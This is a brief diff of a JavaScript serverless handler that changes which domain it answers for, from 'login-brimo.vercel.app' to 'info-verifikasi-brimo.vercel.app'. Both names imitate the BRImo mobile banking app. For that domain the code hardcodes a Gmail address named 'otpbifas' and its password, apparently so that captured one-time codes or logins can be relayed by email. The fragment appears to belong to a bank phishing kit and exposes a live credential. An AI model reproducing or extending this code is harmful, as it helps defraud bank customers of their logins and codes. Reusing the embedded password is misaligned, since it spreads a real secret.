@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-     if (url == 'login-brimo.vercel.app'){
+     if (url == 'info-verifikasi-brimo.vercel.app'){
 
        email = 'otpbifas@gmail.com'
        pass = 'xdlrtyyqmcgcwahc'
